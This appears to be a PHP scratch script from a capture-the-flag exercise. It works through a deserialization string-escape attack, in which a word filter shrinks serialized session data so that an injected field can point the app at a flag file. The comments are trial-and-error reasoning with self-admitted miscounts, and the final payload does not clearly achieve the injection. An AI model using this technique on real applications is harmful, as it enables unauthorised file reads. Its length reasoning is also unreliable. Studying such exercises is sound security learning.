<?php
// The key insight: when filter removes 'flag' (4 chars), the serialized length
// still says 45, but the actual content is now 41 chars (45 - 4 = 41)
// 
// The parser will try to read 45 bytes from the string content
// But the content is only 41 bytes, so it reads into the next field

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}

// Let's trace through the parsing:
// Filtered: a:3:{s:4:"user";s:45:"";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:8:"function";...
// 
// Parser reads:
// a:3: - array with 3 elements
// s:4:"user" - key "user"
// s:45:" - value is string of length 45
//   Now it reads 45 bytes starting from position after the opening quote
//   The content is: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
//   Let's count: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
//   That's way more than 45 chars
//   
//   First 45 chars: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}";s:8:"f
//   This becomes the value of 'user'
//   
//   Then parser continues from: unction";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
//   This is broken! "unction" is not a valid serialized type

// So the issue is that after reading 45 bytes, the remaining string is corrupted

// Let me think about this differently.
// We need the injection to result in a VALID serialized string after parsing

// The trick is to use the escape to inject a COMPLETE new element
// that REPLACES the remaining structure

// Let's try:
// user = 'flag' + '";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}' + padding
// 
// We want the parser to read:
// s:45:"[45 bytes of content]"
// Where the 45 bytes include our injection that closes the string properly
// and adds a new img element

// The problem is: after reading 45 bytes, the parser expects to see the next element
// But we've consumed part of the original structure

// Let me try a different approach:
// What if we inject enough content to COMPLETE the array?

// Original: a:3:{user;function;img;}
// After escape: a:3:{user;[injected img];}  <- but this only has 2 elements!

// We need to inject: [value];s:8:"function";s:10:"show_image";s:3:"img";s:20:"NEW_IMG";}
// This would complete the array with our new img

// Actually, let's think about this from the end:
// We want the final parsed array to have img = "ZDBnM19mMWFnLnBocA=="
// 
// The original array has 3 elements: user, function, img
// If we can inject a DUPLICATE img key, the later one wins

// Let me try:
// user = 'flag' + padding + '";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}'
// 
// Wait, this is getting too complex. Let me try a simpler approach.

// What if we use the 'function' field instead of 'user'?
// function = 'show_image' (10 chars)
// 
// If we set function = 'flagshow_image', after filter it becomes 'show_image'
// The length would be s:14:"flagshow_image" -> s:14:"show_image"
// Parser expects 14 bytes, gets 10, reads 4 more from next field

// Let's trace:
// Serialized: s:14:"flagshow_image";s:3:"img";s:20:"BASE64";}
// After filter: s:14:"show_image";s:3:"img";s:20:"BASE64";}
// Parser reads 14 bytes from "show_image" (10 chars)
// Then reads 4 more: ";s:3"
// So the value becomes "show_image";s:3"
// Then parser continues from "img";s:20:"BASE64";}
// This is broken!

// Hmm, let me try yet another approach.
// What if we inject from the 'function' field?

// The serialized string:
// a:3:{s:4:"user";s:5:"guest";s:8:"function";s:10:"show_image";s:3:"img";s:20:"BASE64";}
// 
// If we set function = 'flag";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}'
// Serialized: s:41:"flag";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// After filter: s:41:"";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// Parser reads 41 bytes from "" (empty)
// Reads: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// That's 37 chars, not 41

// We need 4 more chars. Let's add padding to the injection:
// function = 'flag";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}XXXX'
// Serialized: s:45:"flag";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}XXXX"
// After filter: s:45:"";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}XXXX"
// Parser reads 45 bytes from ""
// Reads: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}XXXX"
// That's 41 chars, still not 45

// Wait, I keep making the same mistake. Let me count more carefully.
// After filter, the string is: "";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}XXXX"
// The parser reads from position right after s:45:"
// It reads 45 bytes

// Let me count the content after the opening quote:
// ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}XXXX
// " = 1
# ; = 1
# s = 1
# : = 1
# 3 = 1
# : = 1
# " = 1
# i = 1
# m = 1
# g = 1
# " = 1
# ; = 1
# s = 1
# : = 1
# 2 = 1
# 0 = 1
# : = 1
# " = 1
# Z = 1
# D = 1
# B = 1
# n = 1
# M = 1
# 1 = 1
# 9 = 1
# m = 1
# M = 1
# W = 1
# F = 1
# n = 1
# L = 1
# n = 1
# B = 1
# o = 1
# c = 1
# A = 1
# = = 1
# = = 1
# " = 1
# ; = 1
# } = 1
# X = 1
# X = 1
# X = 1
# X = 1
# Total: 41 chars

// So we need 45 - 41 = 4 more chars
// Let's add 4 more X's:
// function = 'flag";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}XXXXXXXX'
// That's 41 + 4 = 45 chars after the opening quote

// But wait, we also need to account for the closing quote and semicolon!
// After reading 45 bytes, the parser expects to see "; to close the string
// But our 45 bytes already include the closing quote and semicolon

// Let me trace through more carefully:
// After filter: s:45:"";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}XXXXXXXX";s:3:"img";...
// 
// Wait, I'm confusing myself. Let me write out the full serialized string.

// Original session:
// user = 'guest'
// function = 'flag";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}XXXXXXXX'
// img = 'Z3Vlc3RfaW1nLnBuZw=='

$_SESSION = [];
$_SESSION['user'] = 'guest';
$_SESSION['function'] = 'flag";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}XXXXXXXX';
$_SESSION['img'] = 'Z3Vlc3RfaW1nLnBuZw==';

echo "Session:\n";
var_dump($_SESSION);

echo "\nSerialized:\n";
$serialized = serialize($_SESSION);
echo $serialized . "\n";

echo "\nFiltered:\n";
$filtered = filter($serialized);
echo $filtered . "\n";

echo "\nTrying to unserialize:\n";
$result = @unserialize($filtered);
var_dump($result);

// Let me also check what the parser would read
echo "\n=== Manual parsing ===\n";
// After filter: a:3:{s:4:"user";s:5:"guest";s:8:"function";s:45:"";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}XXXXXXXX";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// The parser reads:
// a:3: - array with 3 elements
// s:4:"user" - key
// s:5:"guest" - value
// s:8:"function" - key
// s:45:" - value is string of length 45
//   Content: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}XXXXXXXX
//   That's exactly 45 chars!
//   Then parser expects "; to close
//   But the next char is "; which is correct!
//   
// Wait, let me count again:
// ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}XXXXXXXX
// Starting from the position after s:45:"
// 
// Position 0: " (closing quote of empty string)
// Position 1: ;
// Position 2: s
// ...
// Let me just count the string: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}XXXXXXXX
echo "String to read: " . '";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}XXXXXXXX' . "\n";
echo "Length: " . strlen('";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}XXXXXXXX') . "\n";

